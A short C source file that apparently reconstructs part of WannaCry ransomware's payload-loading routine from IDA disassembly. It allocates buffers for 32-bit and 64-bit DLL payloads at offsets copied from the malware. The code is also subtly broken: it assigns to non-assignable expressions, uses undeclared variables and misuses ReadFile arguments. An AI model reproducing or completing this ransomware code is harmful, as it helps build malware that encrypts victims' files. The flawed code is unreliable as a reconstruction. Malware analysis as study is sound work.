#include <stdio.h>
#include <windows.h>

//EXE file global here
volatile HGLOBAL hDLL_x86;
volatile HGLOBAL hDLL_x64;

//init the DLL payload here
//read from Wannacry in IDA
//also here: https://www.acronis.com/en-us/blog/posts/wannacry-attack-what-it-and-how-protect-your-computer
//Memory alloc functions: https://www.tenouk.com/visualcplusmfc/visualcplusmfc20.html
void initialize_payload()
{
	/*
	32-bit dll start address 0x40B020, size is 0x4060 bytes
	64-bit dll start address 0x40F080, size is 0xc8a4 bytes
	*/
	DWORD NumberOfBytesRead;
	DWORD fileSize;
	//size = 0x4060 converted to decimal: 16480
	//Possibly -> GlobalAlloc(GPTR, 5298176)
	hDLL_x86 = GlobalAlloc(GMEM_ZEROINIT, 5298176); 
	/* 0x50D000 found in IDA but most likely: 0x506000 for 32 bit */
	
	//size = 0xc8a4 converted to decimal: 51364
	//Possibly -> GlobalAlloc(GPTR, 5298176)
	hDLL_x64 = GlobalAlloc(GMEM_ZEROINIT, 5298176); //0x50D000 found in IDA
	
	//if no errors continue
	if(hDLL_x86 && hDLL_x64)
	{
		//GENERIC_READ is 0x80000000 and GENERIC_WRITE is 0x40000000
		HANDLE fileHandle = CreateFileA(Filename, 0x80000000, 1, NULL, 3, 4, NULL);
		if(fileHandle != INVALID_HANDLE_VALUE)
		{
			fileSize = GetFileSize(fileHandle, NULL);
			*(DWORD*)hDLL_x86 + 0x4060 = fileSize; //Dword length written in x86 DLL buffer
			*(DWORD*)hDLL_x64 + 0xc8a4 = fileSize; //Dword length written in x64 DLL buffer
			ReadFile(fileHandle, hDLL_x86 + 0x4060 + sizeof(DWORD), &fileSize, &NumberOfBytesRead, 0);
			ReadFile(fileHandle, hDLL_x64 + 0xc8a4 + sizeof(DWORD), &fileSize, &NumberOfBytesRead, 0);
    			CloseHandle(fileHandle);
		}
	}
	else
	{
		GlobalFree(hMemory_x86);
		GlobalFree(hMemory_x64);
	}
}
